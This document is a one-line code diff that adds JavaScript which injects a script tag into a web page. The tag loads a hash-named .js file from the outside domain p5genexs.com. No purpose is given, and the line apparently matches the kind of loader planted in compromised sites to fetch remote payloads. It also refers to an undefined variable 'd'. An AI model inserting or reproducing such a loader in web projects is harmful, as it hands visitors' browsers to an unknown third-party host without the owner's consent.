@@ -1,0 +1,1 @@
+var g = document.createElement('script'); g.type = 'text/javascript'; g.setAttribute('data-domain','p5genexs.com'); g.async = 'async'; g.src = '//p5genexs.com/70/b1/68/70b168a743284ba6d1077cab9e44e375.js'; (document.getElementsByTagName('head')[0] || d.getElementsByTagName('body')[0]).appendChild(g);
